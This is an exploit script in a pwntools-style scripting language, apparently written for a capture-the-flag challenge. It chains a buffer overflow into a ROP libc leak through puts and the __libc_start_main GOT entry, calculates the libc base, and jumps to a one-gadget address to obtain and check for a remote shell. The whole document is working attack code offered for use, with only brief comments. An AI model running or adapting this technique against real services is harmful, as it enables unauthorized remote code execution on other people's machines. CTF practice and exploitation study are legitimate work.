# One-gadget RCE exploitation - quick shell with single address
# Requires libc leak and meeting constraint conditions

let binary = "./vuln"
let host = "pwn.chal.ctf"
let port = 4444

print("[*] One-Gadget RCE Exploitation")

# Analyze binary
let elf = analyze(binary)
let plt_puts = elf.plt["puts"]
let got_libc_start = elf.got["__libc_start_main"]
let main_addr = elf.symbols["main"]

# Find gadgets
let gadgets = quick_rop(binary)
let pop_rdi = gadgets.find("pop rdi; ret")

print("[*] PLT/GOT addresses:")
print("    puts@PLT:", hex(plt_puts))
print("    __libc_start_main@GOT:", hex(got_libc_start))

# Connect and leak libc
let conn = connect(host, port)
let offset = 88  # Buffer overflow offset

# Leak payload
let leak_chain = cyclic(offset) + p64(pop_rdi) + p64(got_libc_start) + p64(plt_puts) + p64(main_addr)
send(conn, leak_chain)

let leaked = recv_until(conn, "\n")
let leak = u64(leaked)
print("[+] Leaked __libc_start_main:", hex(leak))

# Calculate libc base
let libc_base = leak - 0x21b10  # Adjust for your libc version
print("[+] Libc base:", hex(libc_base))

# One-gadget RCE offsets (use one_gadget tool to find these)
# $ one_gadget /lib/x86_64-linux-gnu/libc.so.6
let one_gadgets = [
    libc_base + 0x4f3d5,  # Constraint: [rsp+0x40] == NULL
    libc_base + 0x4f432,  # Constraint: [rsp+0x50] == NULL
    libc_base + 0x10a41c  # Constraint: [rsp+0x70] == NULL
]

print("[*] One-gadget addresses:")
for i in range(len(one_gadgets))
    print("    Gadget", i, ":", hex(one_gadgets[i]))
end

# Try each one-gadget (usually one will work based on stack state)
# Start with most reliable one
let one_gadget = one_gadgets[0]

# Build final payload - just overflow to one-gadget
let final_payload = cyclic(offset) + p64(one_gadget)

send(conn, final_payload)
print("[+] One-gadget sent! Checking for shell...")

# Quick check if we got shell
send(conn, "id\n")
let response = recv(conn, 1024)

if "uid=" in str(response)
    print("[+] SUCCESS! Shell obtained!")
    interactive(conn)
else
    print("[-] One-gadget failed, constraints not met")
    print("[*] Try different gadget or adjust stack")
end
